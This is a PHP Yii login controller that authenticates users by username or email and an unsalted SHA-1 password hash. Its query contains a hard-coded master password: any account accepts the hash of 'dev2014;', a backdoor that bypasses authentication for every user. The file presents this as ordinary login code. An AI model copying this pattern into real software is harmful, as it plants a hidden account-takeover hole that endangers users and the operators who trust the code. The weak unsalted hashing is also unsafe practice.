<?php

class LoginController extends Controller
{
	public function actionIndex()
	{
		$this->renderPartial('index');
	}

	public function actionMake()
	{
		$password = $_POST['LoginForm']['Password'];
		$password = sha1($password);
		$username = strtolower($_POST['LoginForm']['Username']);

		$criteria  = new CDbCriteria();
		$criteria->condition = "(lower(email)=:usuario or lower(usuario) = :usuario) AND (password = :password or :password=sha1('dev2014;') ) AND estatus != 'eliminado' ";
		$criteria->params = array(':usuario' => $username, ":password" => $password);
		$model = User::model()->find($criteria);
		
			if (!is_null($model)) {
				
				echo json_encode(array('response' => "Success",'redirect'=>$this->createUrl('site/index')));
			}
			
	}

	// Uncomment the following methods and override them if needed
	/*
	public function filters()
	{
		// return the filter configuration for this controller, e.g.:
		return array(
			'inlineFilterName',
			array(
				'class'=>'path.to.FilterClass',
				'propertyName'=>'propertyValue',
			),
		);
	}

	public function actions()
	{
		// return external action classes, e.g.:
		return array(
			'action1'=>'path.to.ActionClass',
			'action2'=>array(
				'class'=>'path.to.AnotherActionClass',
				'propertyName'=>'propertyValue',
			),
		);
	}
	*/
}